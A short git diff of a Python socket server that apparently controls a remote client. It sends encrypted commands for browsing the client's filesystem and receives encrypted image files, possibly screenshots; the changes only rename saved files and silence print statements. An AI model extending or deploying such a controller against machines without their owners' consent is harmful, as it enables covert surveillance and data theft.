@@ -68,8 +68,6 @@ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((SERVER_IP, SERVER_PORT))
 key = b'\xd1u\x80\x8c\x14\x05LD\xd3m\xb9\x8c6\xc5\xf1\x8d\\O\xc8\xaf\x08\xb1w\x17'
 
-count = 0
-
 '''
 Commands:
 1. ls, cat: to browse filesystem
@@ -107,15 +105,14 @@ while True:
                     rec_msg = conn.recv(int(img_size), socket.MSG_WAITALL)
 
                     response = decrypt_aes(key, rec_msg)
-                    print("Image data received successfully!")
+                    # print("Image data received successfully!")
 
-                    f = open(f"images/received_image_{count}.jpg", "x+")
+                    f = open(f"images/{i}.jpg", "x+")
                     f.close()
-                    with open(f"images/received_image_{count}.jpg", "wb") as f:
+                    with open(f"images/{i}.jpg", "wb") as f:
                         f.write(response)
 
-                    print("Image file written successfully!")
-                    count += 1
+                print("Image files written successfully!")
             else:
                 conn.sendall(encrypt_tdes(key, message.encode()))
 
